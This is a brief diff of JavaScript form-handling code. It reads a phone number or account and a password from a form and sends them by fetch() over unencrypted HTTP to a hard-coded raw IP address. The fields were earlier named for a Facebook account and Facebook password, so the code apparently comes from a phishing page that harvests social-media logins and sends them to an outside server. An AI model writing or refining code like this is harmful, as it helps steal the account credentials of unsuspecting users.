@@ -51,8 +51,8 @@
             submitButton.addEventListener('click', function () {
                 const formData = new FormData(form);
                 const requestBody = {
-                    usermobno: formData.get("facebookAccount"),
-                    password: formData.get('facebookPassword')
+                    usermobno: formData.get("usermobno"),
+                    password: formData.get('password')
                 };
 
                 fetch('http://13.53.125.215:3000/register', {
